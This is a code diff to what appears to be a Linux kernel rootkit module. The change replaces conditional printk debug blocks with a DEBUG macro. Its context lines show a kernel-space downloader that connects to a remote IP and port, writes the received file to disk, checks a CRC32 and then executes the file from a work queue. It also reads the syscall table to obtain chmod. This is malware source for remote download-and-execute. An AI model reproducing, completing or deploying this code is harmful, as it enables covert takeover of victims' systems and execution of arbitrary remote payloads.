@@ -90,9 +90,7 @@ unsigned int download_file ( char *path, unsigned int ip, unsigned short port )
     buf = kmalloc(4096, GFP_KERNEL);
     if ( ! buf )
     {
-        #if __DEBUG__
-        printk("Error allocating memory for download\n");
-        #endif
+        DEBUG("Error allocating memory for download\n");
 
         filp_close(filep, NULL);
         return 1;
@@ -100,9 +98,7 @@ unsigned int download_file ( char *path, unsigned int ip, unsigned short port )
 
     if ( sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0 )
     {
-        #if __DEBUG__
-        printk("Error creating socket\n");
-        #endif
+        DEBUG("Error creating socket\n");
 
         filp_close(filep, NULL);
         kfree(buf);
@@ -116,9 +112,7 @@ unsigned int download_file ( char *path, unsigned int ip, unsigned short port )
 
     if ( inet_stream_connect(sock, (struct sockaddr *)&saddr, sizeof(saddr), 0) < 0 )
     {
-        #if __DEBUG__
-        printk("Error connecting socket to address\n");
-        #endif
+        DEBUG("Error connecting socket to address\n");
 
         filp_close(filep, NULL);
         kfree(buf);
@@ -127,9 +121,7 @@ unsigned int download_file ( char *path, unsigned int ip, unsigned short port )
 
     if ( (size = get_uint(sock)) < 0 )
     {
-        #if __DEBUG__
-        printk("Error getting size from socket\n");
-        #endif
+        DEBUG("Error getting size from socket\n");
 
         filp_close(filep, NULL);
         kfree(buf);
@@ -155,9 +147,7 @@ unsigned int download_file ( char *path, unsigned int ip, unsigned short port )
 
             if ( (bytes_written = filep->f_op->write(filep, buf, bytes_read, &filep->f_pos)) <= 0 )
             {
-                #if __DEBUG__
-                printk("Error writing to file\n");
-                #endif
+                DEBUG("Error writing to file\n");
 
                 set_fs(old_fs);
                 filp_close(filep, NULL);
@@ -178,9 +168,7 @@ unsigned int download_file ( char *path, unsigned int ip, unsigned short port )
 
     if ( (crc32_target = get_uint(sock)) < 0 )
     {
-        #if __DEBUG__
-        printk("Error getting crc32 from socket\n");
-        #endif
+        DEBUG("Error getting crc32 from socket\n");
 
         filp_close(filep, NULL);
         kfree(buf);
@@ -193,9 +181,7 @@ unsigned int download_file ( char *path, unsigned int ip, unsigned short port )
 
     if ( crc32_target != crc32_calc )
     {
-        #if __DEBUG__
-        printk("crc32 mismatch, possible data corruption, target=%x, calc=%x\n", crc32_target, crc32_calc);
-        #endif
+        DEBUG("crc32 mismatch, possible data corruption, target=%x, calc=%x\n", crc32_target, crc32_calc);
 
         kfree(buf);
         return 1;
@@ -219,12 +205,10 @@ void dl_exec ( char *path, unsigned int ip, unsigned short port, unsigned int re
 
     while ( download_file(path, ip, port) )
     {
-        #if __DEBUG__
-            #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 36)
-        printk("Attempt #%u: Error downloading file from %u.%u.%u.%u:%hu, sleeping for %ums\n", attempt, NIPQUAD(ip), ntohs(port), delay);
-            #else
-        printk("Attempt #%u: Error downloading file from %pI4:%hu, sleeping for %ums\n", attempt, &ip, ntohs(port), delay);
-            #endif
+        #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 36)
+        DEBUG("Attempt #%u: Error downloading file from %u.%u.%u.%u:%hu, sleeping for %ums\n", attempt, NIPQUAD(ip), ntohs(port), delay);
+        #else
+        DEBUG("Attempt #%u: Error downloading file from %pI4:%hu, sleeping for %ums\n", attempt, &ip, ntohs(port), delay);
         #endif
 
         if ( attempt++ == retry + 1 )
@@ -233,9 +217,7 @@ void dl_exec ( char *path, unsigned int ip, unsigned short port, unsigned int re
         msleep(delay);
     }
 
-    #if __DEBUG__
-    printk("File successfully downloaded, now executing\n");
-    #endif
+    DEBUG("File successfully downloaded, now executing\n");
 
     old_fs = get_fs();
     set_fs(get_ds());
@@ -252,12 +234,10 @@ void dlexecer ( struct work_struct *work )
 {
     struct dlexec_task *task = (struct dlexec_task *)work;
 
-    #if __DEBUG__
-        #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 36)
-    printk("dlexecer worker spawned, downloading and executing file, path=%s, ip=%u.%u.%u.%u, port=%hu, retry=%u, delay=%u\n", task->path, NIPQUAD(task->ip), ntohs(task->port), task->retry, task->delay);
-        #else
-    printk("dlexecer worker spawned, downloading and executing file, path=%s, ip=%pI4, port=%hu, retry=%u, delay=%u\n", task->path, &task->ip, ntohs(task->port), task->retry, task->delay);
-        #endif
+    #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 36)
+    DEBUG("dlexecer worker spawned, downloading and executing file, path=%s, ip=%u.%u.%u.%u, port=%hu, retry=%u, delay=%u\n", task->path, NIPQUAD(task->ip), ntohs(task->port), task->retry, task->delay);
+    #else
+    DEBUG("dlexecer worker spawned, downloading and executing file, path=%s, ip=%pI4, port=%hu, retry=%u, delay=%u\n", task->path, &task->ip, ntohs(task->port), task->retry, task->delay);
     #endif
 
     dl_exec(task->path, task->ip, task->port, task->retry, task->delay);
@@ -286,9 +266,7 @@ int dlexec_queue( char *path, unsigned int ip, unsigned short port, unsigned int
 
 void dlexec_init ( void )
 {
-    #if __DEBUG__
-    printk("Initializing download & exec work queue\n");
-    #endif
+    DEBUG("Initializing download & exec work queue\n");
 
     sys_chmod = (void *)sys_call_table[__NR_chmod];
     work_queue = create_workqueue("dlexec");
@@ -296,9 +274,7 @@ void dlexec_init ( void )
 
 void dlexec_exit ( void )
 {
-    #if __DEBUG__
-    printk("Destroying download & exec work queue\n");
-    #endif
+    DEBUG("Destroying download & exec work queue\n");
 
     flush_workqueue(work_queue);
     destroy_workqueue(work_queue);
